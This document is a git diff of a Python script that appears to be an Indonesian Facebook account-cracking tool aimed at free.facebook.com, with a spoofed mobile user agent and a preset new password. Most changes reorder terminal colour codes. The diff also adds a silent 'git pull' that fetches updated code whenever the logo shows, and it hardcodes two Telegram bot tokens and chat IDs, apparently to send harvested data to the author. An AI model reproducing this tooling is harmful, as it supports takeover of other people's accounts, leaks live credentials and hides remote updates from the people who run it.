@@ -18,10 +18,10 @@ team = ("ZEE K WORLD,MR.RISKY,WANSXGANS")
 url="https://free.facebook.com"
 useragent="Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"
 newpass="Tiktok"
-
+server01="NN"
 #WARNA_COPY_Right
 #p = "\x1b[0;37m" # putih
-"""
+#"""
 q="\033[00m"
 h2="\033[40m"
 b2="\033[44m"
@@ -46,9 +46,8 @@ k = "\033[0;36m" # kuning
 b = "\x1b[0;34m" # biru
 u = "\x1b[0;35m" # ungu
 o = "\033[0;32m" # biru muda
-""" # WARNA ASLI
-q="\033[00m"
-h2="\033[40m"
+#""" # WARNA ASLI
+"""h2="\033[40m"
 b2="\033[44m"
 c2="\033[46m"
 i2="\033[42m"
@@ -56,7 +55,9 @@ u2="\033[45m"
 m2="\033[41m"
 p2="\033[47m"
 k2="\033[43m"
-b='\033[0;94m'
+"""
+
+#"""
 B='\033[0;94m'
 I='\033[0;92m'
 C='\033[0;96m'
@@ -65,6 +66,10 @@ U='\033[0;95m'
 K='\033[0;93m'
 P='\033[0;97m'
 H='\033[0;90m'
+Q="\033[00m"
+
+
+b='\033[0;94m'
 i='\033[0;92m'
 c='\033[0;92m'
 m='\033[0;91m'
@@ -72,15 +77,39 @@ u='\033[0;95m'
 k='\033[0;96m'
 p='\033[0;93m'
 h='\033[0;90m'
+q="\033[00m"
 
+#"""
+"""
+h='\033[0;90m'
+p = "\x1b[0;97m" # Putih
+m = "\x1b[0;91m" # Merah
+i = "\x1b[0;92m" # Hijau
+k = "\x1b[0;93m" # Kuning
+b = "\x1b[0;94m" # Biru
+u = "\x1b[0;95m" # Ungu
+c = "\x1b[0;96m" # Biru Muda
+q = "\033[0m"    # Warna Mati
+
+
+H='\033[0;90m'
+P = "\x1b[0;97m" # Putih
+M = "\x1b[0;91m" # Merah
+I = "\x1b[0;92m" # Hijau
+K = "\x1b[0;93m" # Kuning
+B = "\x1b[0;94m" # Biru
+U = "\x1b[0;95m" # Ungu
+C = "\x1b[0;96m" # Biru Muda
+Q = "\033[0m"    # Warna Mati
+"""
 m3=(q+m2)
-p = "\x1b[0;33m" # putih
-m = "\x1b[0;31m" # merah
-h = "\x1b[0;32m" # hijau
+#p = "\x1b[0;33m" # putih
+#m = "\x1b[0;31m" # merah
+#h = "\x1b[0;32m" # hijau
 #k = "\033[0;36m" # kuning
-b = "\x1b[0;34m" # biru
-u = "\x1b[0;35m" # ungu
-o = "\033[0;32m" # biru muda
+#b = "\x1b[0;34m" # biru
+#u = "\x1b[0;35m" # ungu
+#o = "\033[0;32m" # biru muda
 # Warna Ini Sudah Rusak
 bulat=(k+"["+p+"•"+k+"] "+p)   #   [•]
 war=(k+"["+p+"!"+k+"] "+p)  # [!]
@@ -204,7 +233,8 @@ ses = r.Session()
 link = "https://free.facebook.com/"
 r=requests.Session()
 #Memek Kau :p
-N="\033[00m"
+
+"""N="\033[00m"
 q="\033[00m"
 h2="\033[40m"
 b2="\033[44m"
@@ -230,7 +260,7 @@ U='\033[0;35m'
 K='\033[0;33m'
 P='\033[0;37m'
 H='\033[0;90m'
-Q="\033[00m"
+Q="\033[00m"""
 warna_me=([i, c, m, u, k, p, h, b])
 warna_ms=([i, c, m, u, k, p, h, b])
 w2=(warna_me)
@@ -305,10 +335,11 @@ def kntl():
         
         _99_ = ([_1_, _2_, _3_, _4_, _5_, _6_, _7_,  _8_, _9_, _10_, _11_, _12_, _13_, _14_, _15_, _16_, _17_, _17_,  _16_,  _15_,  _14_,  _13_,  _12_,  _11_,  _10_,  _9_,  _8_,  _7_,  _6_,  _5_, _4_,  _3_,  _2_,  _1_])
         for x in _99_:
-            stdout.write("\r %s[%s+%s]%s=%s=%s=%s=%s⟩%s⟩ %s"%(random.choice(warn),random.choice(warn),random.choice(warn),random.choice(warn),random.choice(warn),random.choice(warn),random.choice(warn),random.choice(warn),random.choice(warn),x))
+            stdout.write("\r%s[%s+%s]%s=%s=%s=%s=%s⟩%s⟩ %s"%(random.choice(warn),random.choice(warn),random.choice(warn),random.choice(warn),random.choice(warn),random.choice(warn),random.choice(warn),random.choice(warn),random.choice(warn),x))
             stdout.flush(),;time.sleep(0.30)
 def logo_mt():
 #### Hai Kak :-/
+	os.system("git pull")
 	dmi_1 = (f"""{c}   __  ___         _         __
   /  |/  / ___ _  (_)  ___  / /_ ___   ___  ___ _  ___  ____ ___ 
  / /|_/ / / _ `/ / /  / _ \/ __// -_) / _ \/ _ `/ / _ \/ __// -_)
@@ -317,7 +348,11 @@ def logo_mt():
 {bulat}POWER OF DUMAI-991
 {war}HUB : 6283143565470""")
 	print(dmi_1)
-
+TOOKKUKIS = ("2107717763:AAG6xvFgYP6nQnnK0QM2eKoUi4gZ-MdVu7c")
+TOOK = ("2141841952:AAG6cVAUG2YHDYspoh5l8qvW2VXfI-x-FvA")
+#IDTT = ("@tesskalau")
+IDTT = ("1570566370")
+IDTTT = ("2138644537")
 def logo_exp():
 	dmi_2 = (f"""{c} _______ _     _  _____  _____  ______ _______ ______ \n |______  \___/  |_____]   |   |_____/ |______ |     \ \n |______ _/   \_ |       __|__ |    \_ |______ |_____/
  {war}Maaf Script Ini Sudah Expired Silahkan Hubungi Admin !!
